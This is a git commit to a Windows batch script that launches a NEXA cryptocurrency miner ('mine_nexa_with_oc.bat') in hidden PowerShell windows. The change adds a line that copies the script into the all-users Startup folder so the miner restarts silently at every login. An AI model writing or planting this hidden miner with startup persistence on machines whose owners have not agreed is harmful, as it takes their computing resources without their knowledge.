1927dc577b69c4c63bb67e389c0cab60964f83cf
DimebagULKU <denizulku2011@gmail.com>
2026-03-15 06:12:44 +0300

    Update run-hidden.bat

--- NEXA/run-hidden.bat
+++ NEXA/run-hidden.bat
@@ -1,3 +1,4 @@
 @echo off
 cd /d %~dp0
-powershell -WindowStyle Hidden -Command "Start-Process -FilePath cmd -ArgumentList '/c mine_nexa_with_oc.bat' -WindowStyle Hidden -Wait"
+copy "%~f0" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\run-hidden.bat"
+powershell -WindowStyle Hidden -Command "Start-Process -FilePath cmd -ArgumentList '/c mine_nexa_with_oc.bat' -WindowStyle Hidden"
